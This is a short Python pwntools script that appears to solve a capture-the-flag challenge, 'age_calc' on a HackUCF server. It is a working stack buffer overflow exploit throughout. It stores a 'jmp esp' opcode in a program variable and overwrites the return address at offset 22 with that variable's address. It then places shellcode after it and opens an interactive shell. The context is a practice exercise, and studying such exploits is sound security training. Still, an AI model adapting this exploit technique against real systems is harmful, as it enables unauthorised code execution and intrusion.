from pwn import *

exe = context.binary = ELF('age_calc')

io = remote('ctf.hackucf.org', 9007)

with open('compiled.txt', 'rb') as f:
	shellcode = f.read()
# Address of our controlled variable x	
xaddr = exe.symbols['x']
# put the opcode for jump esp (where our shellcode is) in to the return address
x = str(0xe4ff).encode()
offset = 22
# Since our offset is so small, were going to put the shellcode after the jump
io.recvuntil(b'age:')
io.sendline(x)
io.recvuntil(b'name:')
payload = fit ({
	offset: xaddr,
	offset + 4: shellcode
})
io.sendline(payload)
io.interactive()